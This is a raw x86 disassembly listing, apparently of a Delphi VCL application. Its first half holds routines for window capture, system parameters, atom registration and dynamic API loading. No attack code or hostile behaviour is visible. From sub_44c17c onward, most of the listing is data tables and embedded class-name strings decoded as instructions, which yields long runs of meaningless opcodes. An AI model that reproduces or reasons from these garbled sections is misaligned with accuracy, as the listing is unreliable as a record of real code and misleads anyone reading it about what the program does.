mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44b938
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b9f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44b99c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44b9cc
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406dc8
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44b9f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b968
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44ba1c
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44b980
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44b99c
pop ebx
retn
mov eax ebx
call sub_44b9cc
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44ba80
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bbe6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44bd04
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44bce8
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44bce8
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44bdf4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40321c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40321c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_40321c
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_40321c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f6c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f6c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44be7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bff4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408f58
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fc0
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f58
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fc0
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40442c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a3b0
mov [ rw-data ] eax
call sub_44ba80
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b8a8
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45dcc0
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45eda4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_460a34
mov ecx r-xdata
mov edx sub_43d9b4
mov eax [ r-xdata ]
call sub_419b64
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bffb
lea eax [ ebp - 0x10 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44c064
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44c0c3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c0ca
retn
mov eax rw-data
call sub_40d3ac
call sub_44bdf4
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
sub_44c0cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44c152
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c159
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44be7c
mov eax [ r-xdata ]
call sub_4199d8
mov eax [ r-xdata ]
call sub_419a78
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
sub_44c17c
sbb al 0xc2
inc esp
add [ eax ] ah
add [ eax ] al
dec eax
mov [ ecx ] es
lodsb [ esi ]
add al [ edx ]
jo r-xdata
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + ecx * 8 + 0x44 ] dh
add [ eax + ebp * 4 ] ah
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 + 0x4e80041 ] cl
inc edx
add ah ah
enter 0x44 0x94
add [ edx ] al
les eax [ edx ]
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
inc esp
add al 0x42
add [ eax + 0x4c004205 ] ch
add eax 0x4e00042
inc edx
add [ eax ] dl
add eax 0x4e40042
inc edx
add [ eax ] bh
0x44
sub_44c206
out dx eax
push edx
push ecx
push [ ecx + ecx * 8 - 0x361fffbc ]
inc esp
add ah al
enter 0x44 0xd4
enter 0x44 0x10
push esp
inc ebx
outsd
outsb
je r-xdata
or [ esp + edx * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x3400408d
retn 0x44
jae r-xdata
outsb
je r-xdata
add [ esi + edi * 8 - 0x58bfffbf ] dh
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
inc edx
popad
jae r-xdata
int3
jo r-xdata
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
inc ecx
add [ edi + edi * 8 - 0x33dfffbf ] cl
inc esp
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc [ ecx ]
inc eax
cmpsd [ esi ] [ edi ]
outsb
inc ebp
outsb
popad
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
nop
0x44
dec esp
imul esi [ ebx + 0x74 ] sub_44c364
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
mov [ ecx ] es
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
add edx [ eax ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah al
retn 0x44
sub_44c2e7
or [ ecx + 0x73 ] ah
dec esi
outsd
jb r-xdata
add al dl
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
inc [ ecx ]
inc eax
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + edi * 8 - 0x33dfffbf ] cl
inc esp
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
jo r-xdata
xor [ eax ] eax
cld
0x44
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
int3
jo r-xdata
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
nop
0x44
dec esp
imul esi [ ebx + 0x74 ] sub_44c364
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44c364
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 - 0x33dfffbf ] cl
inc esp
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_44c3a0
stc
push ebx
push eax
dec [ ebx + ecx * 8 + 0x44 ]
add [ ebx + ecx * 8 - 0x3267ffbc ] dl
inc esp
add [ eax + 0x110044cd ] bh
push esp
inc ebx
jne r-xdata
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bh
0x44
je r-xdata
js r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc ecx
add [ edi + edi * 8 + 0x2cc0041 ] ah
inc edx
add [ eax - 0x5bffbb36 ] dl
int3
add [ eax - 0x59 ] al
inc ecx
add [ edi + edi * 8 - 0x33dfffbf ] cl
inc esp
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] sub_44c364
mov eax [ fs : ecx ]
add al [ eax ]
or [ ecx + 0x63 ] al
je r-xdata
les eax [ edx ]
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
nop
0x44
dec esp
imul esi [ ebx + 0x74 ] 0xc4400000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44c4 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3c ] bh
inc esp
add [ eax ] ch
add [ eax ] al
sbb bl al
inc esp
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
sub_44c440
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 - 0x33dfffbf ] cl
inc esp
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_44c476
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
add dl 0x44
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x44 ] ah
add [ eax ] dh
add [ eax ] al
add [ eax - 0x7e ] dl
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
arpl [ ebp + 0x74 ] si
mov al 0x78
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
inc ebp
js r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
dec esp
imul esi [ ebx + 0x74 ] 0xd7dc0006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add al dl
xor [ eax ] eax
inc ebx
jne r-xdata
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
je r-xdata
outsb
dec esp
imul esi [ ebx + 0x74 ] sub_44c440
enter 0x44c3 0x0
or [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
retn 0x44
inc eax
add ah al
iretd
dec esp
imul esi [ ebx + 0x74 ] 0xc678c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x240041b7 ] cl
test al 0x41
add [ esp + ebp * 4 + 0x41 ] bl
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax ] dh
mov edx 0xba640041
xor al 0x40
inc ebx
push 0x65676e61
add dl 0x44
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
inc ebx
jne r-xdata
inc ecx
add [ eax - 0x46 ] ch
popad
je r-xdata
add al ch
add al 0x42
add ah ah
enter 0x44 0xe0
aam 0x44
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
dec esp
imul esi [ ebx + 0x74 ] r-xdata
inc eax
add [ ecx ] 0x0
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xc6e80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 ] bh
inc esp
add [ eax + 0x44c7 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x39 ] bl
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add [ eax + 0x5c000000 ] ah
rol [ eax + eax - 0x54 ] 0x2
inc edx
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc ecx
add [ edx + edi * 4 + 0x41 ] ch
add [ eax - 0x51 ] al
inc ecx
add al ah
mov ebx 0xbc3c0041
inc ecx
add [ eax ] dl
mov ebp 0xb6000041
inc ecx
add [ ebp + edi * 4 + 0x41 ] cl
add al al
mov ebp 0xd5e80041
inc esp
add al dh
mov bh 0x41
add [ edx + ebp * 4 - 0x4773ffbf ] bl
inc ecx
add ah cl
mov eax 0xb9380041
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add al cl
mov edx 0xb0f40041
inc ecx
add al cl
mov cl 0x41
add [ ebx + edi * 4 ] al
inc ecx
add [ ebx + edi * 4 ] dl
inc ecx
add [ edx + esi * 4 ] ch
inc ecx
add [ eax + 0x2c0041b2 ] al
mov bl 0x41
add ah al
mov ah 0x41
add [ esi * 4 - 0x4a4fffbf ] bl
inc ecx
add [ eax + edi * 4 + 0x41 ] dl
add [ eax - 0x48 ] dh
inc ecx
add [ eax - 0x45 ] ch
inc ecx
add [ eax + 0x780041b9 ] bh
mov ebp 0xbd880041
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
lea eax [ eax ]
int3
sub_44c4d3
fmul st5
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
mov al 0x78
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
add dl 0x44
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x44 ] ah
add [ eax ] dh
add [ eax ] al
add [ eax - 0x7e ] dl
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
arpl [ ebp + 0x74 ] si
mov al 0x78
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add al dl
xor [ eax ] eax
inc ebx
jne r-xdata
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
je r-xdata
inc eax
add ah al
iretd
dec esp
imul esi [ ebx + 0x74 ] 0xc678c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x240041b7 ] cl
test al 0x41
add [ esp + ebp * 4 + 0x41 ] bl
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax ] dh
mov edx 0xba640041
xor al 0x40
inc ebx
push 0x65676e61
add dl 0x44
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
inc ebx
jne r-xdata
inc ecx
add [ eax - 0x46 ] ch
popad
je r-xdata
add al ch
add al 0x42
add ah ah
enter 0x44 0xe0
aam 0x44
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
dec esp
imul esi [ ebx + 0x74 ] r-xdata
inc eax
add [ ecx ] 0x0
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xc6e80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 ] bh
inc esp
add [ eax + 0x44c7 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x39 ] bl
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add [ eax + 0x5c000000 ] ah
rol [ eax + eax - 0x54 ] 0x2
inc edx
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc ecx
add [ edx + edi * 4 + 0x41 ] ch
add [ eax - 0x51 ] al
inc ecx
add al ah
mov ebx 0xbc3c0041
inc ecx
add [ eax ] dl
mov ebp 0xb6000041
inc ecx
add [ ebp + edi * 4 + 0x41 ] cl
add al al
mov ebp 0xd5e80041
inc esp
add al dh
mov bh 0x41
add [ edx + ebp * 4 - 0x4773ffbf ] bl
inc ecx
add ah cl
mov eax 0xb9380041
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add al cl
mov edx 0xb0f40041
inc ecx
add al cl
mov cl 0x41
add [ ebx + edi * 4 ] al
inc ecx
add [ ebx + edi * 4 ] dl
inc ecx
add [ edx + esi * 4 ] ch
inc ecx
add [ eax + 0x2c0041b2 ] al
mov bl 0x41
add ah al
mov ah 0x41
add [ esi * 4 - 0x4a4fffbf ] bl
inc ecx
add [ eax + edi * 4 + 0x41 ] dl
add [ eax - 0x48 ] dh
inc ecx
add [ eax - 0x45 ] ch
inc ecx
add [ eax + 0x780041b9 ] bh
mov ebp 0xbd880041
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
lea eax [ eax ]
int3
sub_44c6e6
inc esp
add [ eax + edx * 8 ] dl
inc esp
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 + 0x4e80041 ] cl
inc edx
add ah ah
enter 0x44 0xe0
aam 0x44
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_44c76a
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x6bffbdfd ] bl
add eax [ edx ]
int3
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
add bh 0x44
add [ edi ] al
or eax 0x73754354
je r-xdata
add [ esp + eax ] ch
inc edx
add [ eax ] al
add al 0x42
add [ eax ] dh
add al 0x42
add [ eax + 0x3 ] dl
inc edx
add ah ah
add eax [ edx ]
cmp [ edx + eax * 2 ] al
add [ eax - 0x32 ] bh
inc esp
add [ esi + ecx * 8 - 0x315fffbc ] cl
inc esp
add [ esi + ecx * 8 - 0x3137ffbc ] dh
inc esp
add ah bl
into
inc esp
add al dh
into
inc esp
add [ edi + ecx * 8 ] al
inc esp
add [ eax ] bl
iretd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
call 0x30450c5a
retn 0x44
sub_44c874
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420488
test bl bl
jle r-xdata
mov edx esi
call sub_44cc88
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44c8e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ff9c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44c98c
sub_44c918
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c8a8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a08c
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41a218
sub_44c960
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404378
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403fc0
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44c98c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44cc88
mov edx ebx
mov eax esi
call sub_44cc68
sub_44c9b4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44c98c
sub_44c9e0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4617b0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403418
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_420514
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43d7e0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ca38
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4617d8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403418
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_420530
test al al
jne r-xdata
